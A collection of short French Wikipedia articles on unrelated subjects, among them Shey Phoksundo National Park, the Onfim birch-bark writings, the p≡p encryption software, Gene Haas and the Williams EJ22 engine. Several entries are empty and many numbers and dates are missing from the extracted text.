<doc id="10579168" url="https://fr.wikipedia.org/wiki?curid=10579168" title="Parc national de Shey Phoksundo">
Parc national de Shey Phoksundo

Le parc national de Shey Phoksundo est un parc national situé au Népal. Inauguré en 1984, il couvre , ce qui en fait le plus grand parc du pays. Le parc couvre des altitudes allant de à , sommet du Kanjiroba. Le lac Phoksundo, site Ramsar depuis 2007, est l'attraction principale, situé à .
Histoire.
Le parc a été créé en 1984. En 1998, une zone tampon de est créée autour du parc.
Climat.
Le parc se situe à la limite entre la zone de climat de la mousson et une zone de climat aride. Alors que le sud du parc peut connaître des précipitations allant jusqu'à , le nord ne reçoit que . Les précipitations se concentrent pendant la mousson de juillet à septembre. L'hiver est féroce, avec des chutes de neige fréquentes à partir de et des températures négatives dès les .
Flore.
Dans les zones arides du parc, on trouve du rhododendron, de la caragana, du genévrier, du saule, du bouleau de l'Himalaya et Abies pindrow. Moins de 5 % de la surface du parc est composée de forêts. Les arbres qui les composent sont l'épicéa, le tsuga, le peuplier ainsi que le bambou.
Faune.
Parmi les résidents du parc, on compte la panthère des neiges, le loup gris, le porte-musc alpin, le grand bharal, ainsi que le goral, l'argali, le jharal, le léopard indien, le chacal, l'ours noir d'Asie et la martre à gorge jaune. Le parc abrite 6 espèces de reptiles et 29 espèces de papillons, dont Paralasa nepalaica, le papillon vivant à l'altitude la plus élevée dans le monde. 200 espèces d'oiseaux nichent dans le parc, dont la perdrix de Hodgson et la bécassine des bois.
Culture.
Des gompas peuvent être trouvées à travers le parc, ainsi que des sites religieux. Shey Gompa, la plus connue du parc, a été construite au . Thashung Gompa, située près du lac Phoksundo a été construite il y a 900 ans. Plus de vivent au sein du parc, pour la majorité des fermiers. La plupart sont bouddhistes, les habitants près du lac Phoksundo pratiquent le bön.

</doc>
<doc id="10579175" url="https://fr.wikipedia.org/wiki?curid=10579175" title="Ovia procurva">
Ovia procurva

Ovia procurva est une espèce d'araignées aranéomorphes de la famille des Lycosidae.
Distribution.
Cette espèce se rencontre en Chine, à Taïwan, au Bhoutan et en Inde.
Description.
Les mâles mesurent de à et les femelles de à .
Systématique et taxinomie.
Cette espèce a été décrite sous le protonyme "Pardosa procurva" par Yu et Song en 1988. Elle est placée dans le genre "Ovia" par Sankaran, Malamel en Sebastian en 2017.

</doc>
<doc id="10579177" url="https://fr.wikipedia.org/wiki?curid=10579177" title="Ovia">
Ovia

Ovia est un genre d'araignées aranéomorphes de la famille des Lycosidae.
Distribution.
Les espèces de ce genre se rencontrent en Chine, à Taïwan, au Laos, à Singapour, au Bhoutan et en Inde.
Liste des espèces.
Selon :

</doc>
<doc id="10579178" url="https://fr.wikipedia.org/wiki?curid=10579178" title="Pardosa procurva">
Pardosa procurva



</doc>
<doc id="10579180" url="https://fr.wikipedia.org/wiki?curid=10579180" title="Lycée Marguerite de Navarre">
Lycée Marguerite de Navarre



</doc>
<doc id="10579181" url="https://fr.wikipedia.org/wiki?curid=10579181" title="Eschweger Klosterbrauerei">
Eschweger Klosterbrauerei

Eschweger Klosterbrauerei est une brasserie dans l'ancienne brasserie d'Eschwege, dans le Land de Hesse.
Histoire.
Le maître boucher et aubergiste George Christoph Andreas fonde la brasserie en 1839. En 1875, Jacob Andreas, le fils du fondateur, installe la brasserie dans l'ancienne abbaye augustine. En 1880, il y a six brasseries à Eschwege.
En 1906, Ernst Andreas reprend l'entreprise et la dirige à partir de 1908 avec son beau-frère Eduard Döhle dans une société par actions. Elle acquiert Bergschlößchen-Brauerei en 1912 puis Bürgerliche Brauhaus à Bad Sooden-Allendorf en 1927.
Au cours de la seconde moitié du , la production est complètement rénovée : une nouvelle usine d'embouteillage en 1966, plusieurs réservoirs de stockage en aluminium en 1970, une nouvelle salle de brassage en 1978. En 2003, le nouveau centre logistique s'installe dans Thüringer Straße.
La brasserie du monastère achète 500 tonnes d'orge brassicole à 16 agriculteurs de l'arrondissement de Werra-Meissner.
De 2009 à 2013, Eschweger Klosterbrauerei produit la bière Duff.
Production.
Outre la marque principale Eschwege Klosterbräu, la brasserie privée produit les bières de la marque Jacobinus.
Eschweger Klosterbrauerei produit aussi sous contrat les marques suivantes :

</doc>
<doc id="10579204" url="https://fr.wikipedia.org/wiki?curid=10579204" title="Maison Bruno Schmidt">
Maison Bruno Schmidt

La maison Bruno Schmidt est un édifice classé de style Art nouveau géométrique édifié à Saint-Gilles, Bruxelles en Belgique, par l'architecte Jean-Baptiste Dewin.
Avec cet édifice et avec l'Institut chirurgical Berkendael, Dewin donne son interprétation de la Sécession viennoise.
Localisation.
La maison Bruno Schmidt est située au numéro 172 de l'avenue Molière, une artère cossue située sur le territoire de la commune de Saint-Gilles-lez-Bruxelles, dans la banlieue sud de Bruxelles.
Elle est située non loin de la maison personnelle de Jean-Baptiste Dewin construite par Dewin au numéro 151 de la même avenue, dans un quartier riche en immeubles de style Art nouveau : Hôtel Hannon, Hôtel Vandenbroeck, maison-atelier du sculpteur Fernand Dubois, maison les Hiboux, maison-atelier Louise de Hem, maison-atelier du peintre Paul Verdussen…
Historique.
C'est en 1910 que Jean-Baptiste Dewin réalise cette habitation de style Art nouveau à la demande de l'ingénieur des Arts et Manufactures Bruno Schmidt.
La maison fait l'objet d'un classement comme monument historique depuis le sous la référence 2071-0093/0.
Architecture.
Le bâtiment présente une façade de trois travées et de trois niveaux, composée de manière symétrique de part et d'autre d'un oriel central.
La géométrisation des volumes et le raffinement des motifs décoratifs de cette façade très graphique révèlent l'attrait de Dewin pour la Sécession viennoise. 
La rez-de-chaussée, édifié en pierre d'Euville alternant avec des bandeaux de pierre bleue est percé d'une porte cochère à droite et d'un triplet de fenêtres à gauche : ces ouvertures sont toutes surmontées d'un linteau à frise de denticules. Le montant droit de la porte cochère porte la signature de l'architecte.
Le premier et le deuxième étage, réalisés en pierre blanche d'Euville, comptent deux travées latérales et un grand oriel central. Ils sont reliés par quatre pilastres moulurés d'ordre colossal (pilastres couvrant plusieurs niveaux) qui donnent un élan vertical à la composition architecturale et se terminent par des amortissements en pierre bleue.
Les fenêtres des étages sont ornées de vitraux aux motifs géométriques et sont surmontées de frise de denticules faisant écho à celles du rez-de-chaussée.
Les allèges des fenêtres du deuxième étage sont ornées de panneaux de mosaïque figurant le faucon représentant la divinité égyptienne Horus. 
Comme le souligne le site de l'inventaire du patrimoine architectural de la Région de Bruxelles-Capitale . C'est également vrai pour la maison Bruno Schmidt puisque, au-delà des deux représentations d'Horus, des abeilles sont figurées sur la grille en fer forgé qui délimite le jardinet et sur les discrètes bouches d'aération situées sous les fenêtres.
Enfin, la partie centrale de la façade se termine par une frise de cinq panneaux de mosaïques aux motifs géométriques typiques de l'art de Dewin.

</doc>
<doc id="10579205" url="https://fr.wikipedia.org/wiki?curid=10579205" title="Blanchefontaine (Doubs)">
Blanchefontaine (Doubs)



</doc>
<doc id="10579211" url="https://fr.wikipedia.org/wiki?curid=10579211" title="Fluorure de mercure(IV)">
Fluorure de mercure(IV)

Le fluorure de mercure() est un composé chimique de formule . Il a été observé en 2007 dans une matrice cryogénique de néon et d'argon à &lt;ref name="10.1002/anie.200703710"&gt;
&lt;/ref&gt;, mais son existence est discutée car il n'a pas été observé l'année suivante lors d'une expérience semblable&lt;ref name="10.1039/B805608K"&gt;
&lt;/ref&gt;.
Si son existence était confirmée, il s'agirait du premier composé de mercure dans lequel cet élément serait à un état d'oxydation supérieur à +2, en l'occurrence ici +4. Ce fait est important, car il impliquerait l'observation effective du cation Hg, lequel présenterait une configuration électronique dans laquelle la sous-couche électronique "d" est incomplète. Or ce dernier point ferait du mercure un métal de transition, que l'IUPAC définit comme « un élément chimique dont les atomes ont une sous-couche électronique "d" incomplète, ou qui peuvent former des cations dont la sous-couche électronique "d" est incomplète », ce qui serait ici précisément le cas. Certains auteurs soulignent néanmoins que, n'étant observable que dans des conditions hors équilibre&lt;ref name="10.1021/ed085p1182"&gt;
&lt;/ref&gt;, le fluorure de mercure() ne serait pas représentatif de la chimie du mercure, laquelle ne connaît par ailleurs que des états d'oxydation au plus égaux à +2, avec une sous-couche "d" complète, de sorte que le mercure devrait être considéré comme un métal pauvre.
La molécule est plane et diamagnétique. Elle est obtenue par réaction de mercure avec du fluor :
Ce composé n'est stable que dans une matrice cryogénique : en cas d'élévation de la température, ou si deux molécules entrent en contact l'une avec l'autre, se décompose en fluorure de mercure(II) et fluor :

</doc>
<doc id="10579223" url="https://fr.wikipedia.org/wiki?curid=10579223" title="Prof et Rebelle">
Prof et Rebelle

Prof et Rebelle ("High School High") est une comédie américaine réalisée par Hart Bochner, sortie en 1996. Il s'agit d'une parodie des films de lycée aux ados en difficulté comme "Esprits rebelles" de John N. Smith ou "Le Proviseur" de Christopher Cain.
Synopsis.
Richard Clark (Jon Lovitz), professeur à la Wellington Academy, obtient un poste d'enseignement au lycée Marion Barry. Mais en arrivant sur place il découvre que le quartier de l'école est un endroit où le gang et la violence règnent. Malgré sa découverte de ce nouveau monde et de ses élèves en difficulté, Clark va trouver les moyens d'aider ses élèves et changer le lycée.
Box-office.
Le film est resté aux États-Unis n° 2 lors de sa sortie , juste derrière le film "Sleepers". Le film est resté dans le top 5 les deux semaines suivantes, ce qui en fait un succès modeste au box-office.
Accueil critique.
Le film a reçu quelque critiques négatives lors de sa sortie. Il détient actuellement une cote de 13 % de « Rotten » sur le Tomatomètre sur Rotten Tomatoes avec une cote de 37 % par le public. Sur Allociné il reçoit une moyenne de 3,2 par les spectateurs.

</doc>
<doc id="10579230" url="https://fr.wikipedia.org/wiki?curid=10579230" title="Église Santa Maria della Concordia">
Église Santa Maria della Concordia

L’église Santa Maria della Concordia ou plus exactement Santa Maria del Carmine alla Concordia est une église du centre historique de Naples donnant sur le bord de la piazzetta qui porte son nom. Elle est dédiée à Notre-Dame du Mont-Carmel et dépend de l'archidiocèse de Naples.
Histoire.
L'église est bâtie en 1556 dans les Quartiers Espagnols selon les dessins du carme Giuseppe Romano. Sa façade est refaite au XVIIIe siècle par Giovan Battista Nauclerio. Niccolò Tagliacozzi Canale refait des travaux de menuiserie en 1735.
Description.
Près de la porte de la sacristie, on remarque une peinture de Ribera figurant "La Sainte Vierge avec saint Michel", mais certains experts l'attribuent à Azzolino.
À gauche de l'entrée, se trouve le monument funéraire de Gaspare Benemerino (mort en 1641), fils du sultan de Fès, qui a renoncé au trône et s'est converti au christianisme pour suivre les armées de Philippe II d'Espagne, comme on peut le lire sur l'inscription lapidaire.
Le couvent des carmes, qui avait abrité un pensionnat et une école de musique, est supprimé par les Français au début du XIXe siècle pour être transformé en prison de débiteurs, amplement citée par la littérature populaire de l'époque.
La façade de Nauclerio est d'un intérêt artistique certain. Sur un fondement de piperno deux paires de lésènes composites en rythment la surface. Elle est couronnée d'un décor rococo de volutes et de cartouches. Elle a été restaurée en 2009 à la suite d'un incendie.

</doc>
<doc id="10579236" url="https://fr.wikipedia.org/wiki?curid=10579236" title="Manifesto">
Manifesto

Manifesto peut désigner :
Le terme Manifesto est aussi inclus dans les expressions :

</doc>
<doc id="10579243" url="https://fr.wikipedia.org/wiki?curid=10579243" title="Épisodes de This Is Us">
Épisodes de This Is Us



</doc>
<doc id="10579247" url="https://fr.wikipedia.org/wiki?curid=10579247" title="Benoît Génauzeau">
Benoît Génauzeau

Benoît Genauzeau, né le à La Rochelle, est un coureur cycliste et directeur sportif français. Durant sa carrière de coureur, il est notamment champion de France de la course aux points en 2004. Il devient ensuite directeur sportif. Il exerce cette fonction dans l'équipe Direct Énergie depuis 2014, après avoir dirigé l'équipe formatrice de celle-ci, Vendée U, de 2006 à 2013.
Biographie.
Benoît Genauzeau commence le cyclisme à l'âge de six ans. À seize ans, il intègre le Pôle espoirs de La Roche-sur-Yon.
En 2004, il remporte le championnat de France de la course aux points, à Hyères. L'année suivante, il intègre l'équipe Vendée U-Pays de la Loire. Il ne court qu'un semestre et met fin à sa carrière. Il devient directeur sportif de cette équipe en 2006.
Après huit années à la tête de Vendée U, Benoît Genauzeau intègre en 2014 l'encadrement de l'équipe Europcar, dont la formation Vendée U est la réserve. Il retrouve ainsi chez les professionnels nombre de coureurs qu'il a dirigés lorsqu'ils étaient amateurs. À partir de janvier 2015, il fait également partie de l'encadrement de l'équipe de France de cyclisme sur piste. Il s'occupe de Thomas Boudat, qui concourt en omnium, et de l'équipe de poursuite.

</doc>
<doc id="10579250" url="https://fr.wikipedia.org/wiki?curid=10579250" title="FreeStyleGames">
FreeStyleGames



</doc>
<doc id="10579259" url="https://fr.wikipedia.org/wiki?curid=10579259" title="Greenacres (Floride)">
Greenacres (Floride)

Greenacres est une ville américaine située dans le comté de Palm Beach en Floride.
&lt;mapframe zoom=11 latitude =26.628056 longitude =-80.135278 align=left width=250 height=250 text="Carte interactive de Greenacres"&gt; { "type": "ExternalData", "service": "geoshape", "ids": "Q990948", "properties": { "fill": "#fc3", "stroke": "#ac6600" } } &lt;/mapframe&gt;

</doc>
<doc id="10579261" url="https://fr.wikipedia.org/wiki?curid=10579261" title="Khitan">
Khitan



</doc>
<doc id="10579263" url="https://fr.wikipedia.org/wiki?curid=10579263" title="Ministère de la marine (Espagne)">
Ministère de la marine (Espagne)



</doc>
<doc id="10579266" url="https://fr.wikipedia.org/wiki?curid=10579266" title="Hilbert van der Duim">
Hilbert van der Duim

Hilbert van der Duim, né le à Beetsterzwaag, est un patineur de vitesse néerlandais.
Biographie.
Hilbert van der Duim se révèle en 1980 lorsqu'il remporte le Championnat du monde toutes épreuves à Heerenveen devant Eric Heiden. Il regagne ce titre en 1982. Il s'impose sur deux Championnats d'Europe toutes épreuves en 1983 et 1984.
Il a également participé à deux éditions des Jeux olympiques, en 1980 à Lake Placid et en 1984 à Sarajevo avec comme meilleur résultat une quatrième place sur en 1980 .

</doc>
<doc id="10579272" url="https://fr.wikipedia.org/wiki?curid=10579272" title="Tonatiuh (planète)">
Tonatiuh (planète)



</doc>
<doc id="10579278" url="https://fr.wikipedia.org/wiki?curid=10579278" title="Onfim">
Onfim

Onfim (novgorodien ancien : , "Onfime" ; dit aussi Anthemius de Novgorod) est un enfant qui a vécu à Novgorod au . Ses devoirs et ses notes d'écolier (lettres, syllabes, mais aussi scènes de bataille et portraits), gravées sur de l'écorce de bouleau, ont été conservées par l'argile du sol de Novgorod. Dix-sept de ces écorces gravées nous sont parvenues.
Contexte historique.
Novgorod est l'actuel centre administratif et chef-lieu de l'oblast de Novgorod, à au sud de Saint-Pétersbourg. Depuis le Moyen Âge, la ville était un centre de pouvoir important et est entourée par de profondes forêts de bouleaux, dont l'écorce était utilisée comme support d'écriture.
Plus de d'écorce de bouleau inscrites ont été découverts depuis les années 1950. Le corpus des inscriptions découvertes augmente chaque année. Selon les historiens, la grande quantité de manuscrits sur écorce semble être un indice de forte alphabétisation de la population de la ville au , puisqu'on identifie un grand nombre de styles d'écriture différents, et donc de mains ayant effectivement écrit.
Les documents d'Onfim.
Les documents d'écoliers d'Onfim sont constitués de dix-sept éléments d'écorce de bouleau inscrite. Douze de ces éléments comportent des illustrations figurées, un des dessins représente visiblement un guerrier à cheval, frappant de sa lance un homme couché à terre. Les différents éléments textuels suggèrent que ces inscriptions sont tous des devoirs scolaires : alphabets, syllabaires répétés, psaumes célèbres faciles à mémoriser et donc à écrire pour s'entraîner, tels que « Seigneur, aide ton serviteur Onfim » (Psaumes 6:2 et 28:3). La plupart des phrases écrites sont d'ailleurs issues du livre des Psaumes.
La plupart des dessins ont trait aux thèmes militaires : chevaliers, chevaux, flèches, ennemis vaincus à terre. L'image la plus frappante semble être un autoportrait d'Onfim grimé en animal fantastique, elle est représentée sur l'écorce , pièce ayant servi de fond pour un panier en osier mais ayant été réemployée pour l'écriture, on y voit une bête avec un très long cou, des oreilles pointues, une queue en tire-bouchon. La bête tient dans sa bouche une flèche avec des plumes (à moins qu'elle ne crache du feu). Le texte adjacent à cette image dit « je suis une bête sauvage », et un phylactère contient la phrase « salutations d'Onfim à Danilo ». Au dos de la pièce , on trouve un exercice d'alphabet. L'écorce contient un alphabet cyrillique de la même main, portant le nom d'Onfim au milieu. En-dessous de cet alphabet, un bateau est représenté. L'écorce 206 enfin contient elle aussi un exercice d'alphabet et des portraits schématiques d'Onfim et de ses amis.

</doc>
<doc id="10579279" url="https://fr.wikipedia.org/wiki?curid=10579279" title="Environnements de développement">
Environnements de développement



</doc>
<doc id="10579280" url="https://fr.wikipedia.org/wiki?curid=10579280" title="Kilmes">
Kilmes



</doc>
<doc id="10579284" url="https://fr.wikipedia.org/wiki?curid=10579284" title="Pretty Easy privacy">
Pretty Easy privacy

pretty Easy privacy (p≡p) est un logiciel de chiffrement et de vérification des données.
Le logiciel permet une gestion des clés cryptographique par l'intermédiaire d'un ensemble de bibliothèques (fournissant des adaptateurs p≡p pour les langages de programmation et les environnements de développement utilisés par les développeurs d'applications informatiques.
L'objectif principal du logiciel est de faire du chiffrement de bout en bout la méthode de communication par défaut pour tous les utilisateurs de la manière la plus simple possible et sur tous les canaux qu'ils utilisent, y compris le courrier électronique, les SMS et tous les autres types de messages.
Le logiciel est disponible sous forme d'extension pour Mozilla Thunderbird et sous forme d'application en version bêta pour Android alors qu'une application iOS ainsi qu'une extension pour Microsoft Outlook sont en cours de développement. P≡p fonctionne sous Microsoft Windows, les systèmes d'exploitation de type Unix, les systèmes d'exploitation Mac OS X et sous Android. Sa fonctionnalité cryptographique est gérée par le moteur p≡p open source s'appuyant sur des implémentations cryptographiques déjà existantes dans des logiciels comme GnuPG, une version modifiée de netpgp (utilisée uniquement dans iOS) et GNUnet (à partir de p≡p v2.0).
Dans sa configuration par défaut, p≡p ne s'appuie pas sur une toile de confiance ou toute forme d'infrastructure de confiance centralisée, mais laisse les utilisateurs vérifier l'authenticité des autres en comparant les empreintes de clé publique sous la forme de chaînes de langage naturel que les développeurs p≡p appellent des "mots de confiance".
Tous les codes sources du logiciel déjà publiés, c'est-à-dire le moteur p≡p, les adaptateurs, les applications et les addons (y compris ceux pour Microsoft Outlook) sont des Free/Libre Open Source Softwares.
Histoire.
Pretty Easy privacy est lancé le 15 septembre 2014 pour Microsoft Outlook uniquement. Son cofondateur est Leon Schumacher.
En 2021, Schumacher est critiqué pour avoir acheté la publication de faux avis positifs sur le Play Store à une agence spécialisée.
Principes de conception.
Par-dessus tout, p≡p - contrairement aux solutions cryptographiques existantes - vise à être facile à installer, utiliser et comprendre. De plus, pour leurs communications, les utilisateurs ne dépendent pas d'une plateforme spécifique (web ou système d'exploitation), d'un système de transport de messages (SMS, courrier électronique, XMPP, etc.) ou d'infrastructures client-serveur ou infonuagiques centralisées : p≡p est 100 % pair-à-pair ("peer-to-peer").
Support d'Enigmail.
Enigmail (une extension de chiffrement et de signature numérique du courrier électronique pour Mozilla Thunderbird et SeaMonkey) a annoncé son soutien pour le nouveau schéma de chiffrement "pretty Easy privacy" dans une extension Thunderbird qui devait être publiée en .
En , une note de la FAQ de p≡p indiquait que le logiciel devait être disponible au troisième trimestre de 2016 et Patrick Brunschwig, le responsable d'Enigmail, avait annoncé l'implantation de la fonctionnalité de base de p≡p dans Enigmail pour , à temps pour le Mozilla Festival qui devait avoir lieu à ce moment à Londres.

</doc>
<doc id="10579285" url="https://fr.wikipedia.org/wiki?curid=10579285" title="Julia Gourand">
Julia Gourand

Julia Gourand est une actrice française née le . De 2015 à 2017, elle joue le rôle de Lylou dans la série "Plus belle la vie".
Biographie.
Julia Gourand prend des cours de théâtre en 2004 à La Compagnie du Message, où elle effectue une formation de six ans en marge de sa scolarité.
Elle étudie ensuite pendant un an à l'École Paris Marais. En 2011 elle fait une formation de théâtre au à Savigny-sur-Orge dans le département de l'Essonne. Après ses années de lycée en spécialité théâtre, elle étudie au Cours Florent.
En 2015, elle joue le rôle de Lylou dans la série "Plus belle la vie" diffusée sur France 3.
En septembre 2022 elle entame la co-animation de "Okoo-koo" avec Boubacar Kabo, Manon Theodet et Karim Ternane sur France 4 et la plateforme Okoo. Cette émission propose des activités, des jeux et des reportages à destination du jeune public.
Vie personnelle.
Elle mesure et pratique le chant.
Filmographie.
Long métrage

</doc>
<doc id="10579292" url="https://fr.wikipedia.org/wiki?curid=10579292" title="Cihangir (Beyoğlu)">
Cihangir (Beyoğlu)

Cihangir est l'un des 45 quartiers du district de Beyoğlu à Istanbul, en Turquie. Il domine le Bosphore et fait face à la Corne d'Or.
Histoire.
Le quartier de Galata, proche de Cihangir, a été stratégiquement habité par les marchands génois et vénitiens du . À la suite de la conquête d’Istanbul par les Ottomans en 1453, le district de Beyoğlu passa aux mains des autorités ottomanes comme le reste de la ville. Les Européens restèrent dans le quartier de Beyoğlu après cette date avec implantation de nombreuses ambassades. Cihangir est peuplé depuis le milieu du mais a complètement brûlé dans les années 1930. Le quartier a été reconstruit en pierre et surtout en béton ainsi que quelques maisons Art nouveau dans ces innombrables petites ruelles en pente. On y trouve un grand nombre d'antiquaires qui sont éparpillés jusqu'au quartier de Çukurcuma, qui jouxte Cihangir. À l'époque ottomane et dans la première moitié du , Cihangir était très cosmopolite, comme c'était le cas d'Istanbul en général. La majorité de la population était grecque, mais des turcs, des arméniens, des juifs et des levantins vivaient également dans le quartier. Les minorités ont progressivement diminué démographiquement, principalement après le Pogrom d'Istanbul (en grec moderne : Σεπτεμβριανά, « événements de septembre »), soit les attaques contre les minorités ethniques locales, visant principalement les communautés grecque et arménienne, qui ont eu lieu à Istanbul dans la nuit du 6-7 septembre 1955. Il existe une importante communauté d'étrangers, il très prisé par les Européens.
Origine du nom.
Au , Soliman le Magnifique était marié à Roxelane et avait un fils, Şehzade Cihangir qui est décédé à un âge très jeune. Soliman le Magnifique ordonna alors la construction d'une mosquée qu'il nomma Cihangir en son honneur. Le quartier a repris le nom.
Presse.
En 2012, le journal britannique "The Guardian" inclut Cihangir dans la liste des cinq meilleurs endroits au monde pour vivre, en compagnie de la ville de Santa Cruz de Tenerife à Espagne, de la côte nord de Maui à Hawai, du district de Sankt Pauli à Hambourg, et de Portland, dans l'Oregon aux États-Unis.

</doc>
<doc id="10579294" url="https://fr.wikipedia.org/wiki?curid=10579294" title="Miss District of Columbia USA">
Miss District of Columbia USA



</doc>
<doc id="10579295" url="https://fr.wikipedia.org/wiki?curid=10579295" title="Miss World 2007">
Miss World 2007



</doc>
<doc id="10579297" url="https://fr.wikipedia.org/wiki?curid=10579297" title="Gene Haas">
Gene Haas

Gene Haas, né le à Youngstown (États-Unis), est une personnalité américaine du sport automobile, surtout connu pour avoir fondé et dirigé les écuries Stewart-Haas Racing, active en NASCAR, et Haas F1 Team, active dans le championnat du monde de Formule 1 depuis 2016.
Biographie.
Haas Automation.
En 1983, Gene Haas fonde son entreprise de machine-outil, Haas Automation, à Sun Valley. L'entreprise distribue d'abord principalement en Californie puis commence à s'étendre à l'échelle des États-Unis. Le réseau s'agrandit en 2000 quand Gene Haas crée une autre usine à Bruxelles pour s'approprier le marché européen. En 2013, Haas Automation employait . L'entreprise compte aujourd'hui quatre usines : à Oxnard en Californie, à Bruxelles, à Bombay et à Shanghaï. Il s'agit d'un des leaders des fabricants de machine-outil dans le monde.
La NASCAR depuis 2002.
Après avoir été le sponsor d'Hendrick Motorsports durant plusieurs années, Gene Haas fonde, en 2002, son écurie de NASCAR, Haas CNC Racing. Il s'engage à temps complet en NASCAR à partir de 2003 et court sur Pontiac. En 2009, le pilote Tony Stewart rentre dans le capital de l'écurie, renommée Stewart-Haas Racing. Il obtient les premières victoires de l'écurie, tandis que Ryan Newman, Kevin Harvick et Kurt Busch remportent eux aussi des courses les années suivantes. Stewart est sacré champion en 2011 et Harvick en 2014. Les numéros traditionnels des voitures de l'écurie sont le 4, le 10, le 14 et le 41, ces deux dernières sponsorisées par Haas Automation. En 2017, l'écurie engage une Ford et les pilotes sont Kevin Harvick, Danica Patrick, Clint Bowyer et Kurt Busch. Busch et Harvick terminent deuxième et troisième du championnat.
Arrivée en Formule 1 en 2016.
En 2013, Gene Haas répond à l'appel d'offre de la Fédération internationale de l'automobile et dépose sa candidature pour inscrire son écurie au championnat du monde de Formule 1 2015. Cette candidature est retenue par la FIA et l'écurie, baptisée Haas F1 Team, est implantée à Kannapolis. Haas conclut un partenariat avec Dallara pour la fourniture du châssis et obtient également de Ferrari la fourniture des moteurs et d'autres composantes techniques. Gene Haas déclare que son écurie fera ses débuts en 2016, afin de préparer au mieux sa première saison. Les pilotes sont le Français Romain Grosjean et le Mexicain Esteban Gutiérrez.
L'écurie fait ses débuts lors du Grand Prix d'Australie et Romain Grosjean termine sixième, puis réédite l'exploit avec une cinquième place lors du deuxième Grand Prix, à Bahreïn. Grosjean rentre dans les points à cinq reprises et en inscrit 29 tandis que le compteur de points de Gutiérrez reste vierge. L'écurie termine huitième du championnat des constructeurs mais Gene Haas reconnaît avoir sous-estimé la Formule 1 et que .
Kevin Magnussen, engagé en 2017 pour épauler Grosjean, inscrit ses premiers points avec sa nouvelle écurie en Chine tandis que Grosjean débloque son compteur une semaine plus tard à Bahreïn. Le Franco-suisse termine treizième du championnat avec 28 points, devant le Danois qui en marque 19. L'écurie se classe à nouveau huitième au classement des constructeurs.
Grosjean et Magnussen sont reconduits pour la saison 2018. La VF-18 se montre encore plus performante et l'écurie américaine se classe cinquième du championnat des constructeurs avec 93 points. Le pilote français termine notamment quatrième du Grand Prix d'Autriche tandis que le Danois termine cinquième.
Le duo de pilotes reste identique en 2019. La VF-19 aborde une nouvelle livrée noir et or, en raison de l'arrivée du nouveau sponsor-titre Rich Energy, fabricant de boissons énergisantes. La saison se passe mal, avec une voiture mal développée et une rupture de contrat avec Rich Energy avant la fin de la saison. Haas termine neuvième avec 28 points, son pire bilan depuis 2016.
Les performances de Haas F1 Team sont encore pires en 2020, dans une saison perturbée par la pandémie de Covid-19 et le développement quasi inexistant de la VF-20. La saison de Haas est surtout marquée par l'accident terrifiant de Romain Grosjean lors du Grand Prix de Bahreïn, qui doit être remplacé par Pietro Fittipaldi pour les deux dernières courses. L'écurie américaine termine neuvième avec trois points inscrits.
En 2021, Romain Grosjean et Kevin Magnussen sont remplacés par le champion de Formule 2 en titre Mick Schumacher et par le Russe Nikita Mazepin. L'écurie termine dernière du championnat des constructeurs, sans avoir marqué de point.
Divers.
Gene Haas a créé en 1999 la Gene Haas Foundation, qui aide certaines communautés locales et certaines associations en manque de fonds.
Entre janvier 2008 et mai 2009, il est incarcéré pour fraude fiscale, après avoir reconnu les faits en 2006.

</doc>
<doc id="10579303" url="https://fr.wikipedia.org/wiki?curid=10579303" title="Williams EJ22">
Williams EJ22

Le Williams EJ22, initialement désigné FJ22, était un petit réacteur à double flux extrêmement léger en cours de développement par le constructeur américain "Williams International" pour être utilisé par des appareils à réaction ultralégers désignés « "Very Light Jets" » (VLJ), ou parfois « "Microjets" ». Ces avions sont des petits "jets" privés pilotés par une seule personne et pouvant embarquer de 4 à , et dont la masse ne doit pas excéder les , soit . Ils sont en quelque-sorte les ULM des avions civils à réaction.
En raison de problèmes de développement, tant mécaniques que « relationnels », ce moteur ne fut jamais certifié par l'administration fédérale américaine (FAA) et n'atteignit jamais le stade de la production en série.
Développement.
Besoin de dynamisme dans la production aéronautique des années 1990.
"Williams International" construisait déjà des petits réacteurs à double flux afin de propulser des missiles de croisière depuis les années 1960, comme le Williams F107, propulsant le "Tomahawk", et entra avec succès dans le marché de l'aviation générale en 1992 avec le FJ44.
Cette même année, la NASA démarra un programme expérimental, l’' (AGATE), afin de se mettre en collaboration avec divers constructeurs et les aider à développer des technologies qui redonneraient un coup de fouet à l'industrie aéronautique stagnante de cette période. En , "Williams International" se joignit au programme "General Aviation Propulsion" (GAP, propulsion aéronautique générale) de l'AGATE pour développer un réacteur à double flux économe en carburant qui serait même plus petit que le FJ44, et qui fut désigné FJX-2.
Premier prototype et expérimentations.
Initialement, Williams attribua un contrat à la société de Burt Rutan, "Scaled Composites", pour concevoir et fabriquer le , un "Very Light Jet" (VLJ) qui serait utilisé comme banc d'essai volant et démonstrateur technologique pour présenter les qualités du nouveau moteur. L'avion, propulsé par deux moteurs temporaires FXJ-1, des moteurs de missiles de croisière adaptés à la propulsion d'aéronefs habités, commença sa carrière lors du meeting aérien d'Oshkosh de 1997. Entre-temps, le développement du FXJ-2 progressait, la majeure partie du travail de conception étant achevée en 1998 et les premières pièces du prototype étant livrées vers de début du deuxième trimestre de cette année.
L'assemblage du premier prototype du FXJ-2 fut achevé le par Williams à Walled Lake, dans le Michigan, ce qui constitua une étape majeure du programme GAP. Ce moteur fut ensuite testé dans les locaux de williams le suivant.
Le FXJ-2 fut conçu avec beaucoup de systèmes et de procédés de fabrications expérimentaux, afin de minimiser le nombre de pièces à produire et réduire les coûts de production, et disposait d'un taux de dilution de 4 pour 1. Résultat de cette manœuvre, il y eut un important nombre de difficultés techniques et de défaillances à surmonter avec le matériel du prototype initial. Toutefois, de nombreux retours sur les planches à dessin, ainsi que l'incorporation de systèmes plus conventionnels, parvinrent à rendre le moteur fiable et lui procurèrent enfin les de poussée nécessaires que demandait la NASA. Le programme atteignit son point culminant avec les tests à haute-altitude effectués au laboratoire de recherches sur la propulsion du "Glenn Research Center" de la NASA, de mars à .
Nouvel intervenant et fin du programme.
En 200, Williams s'associa avec "Eclipse Aviation" afin de produire une version certifiée par la FAA de son FJX-2, alors désigné EJ-22, afin de l'employer dans l'avion ultraléger Eclipse 500, qui devait effectuer son premier vol en .
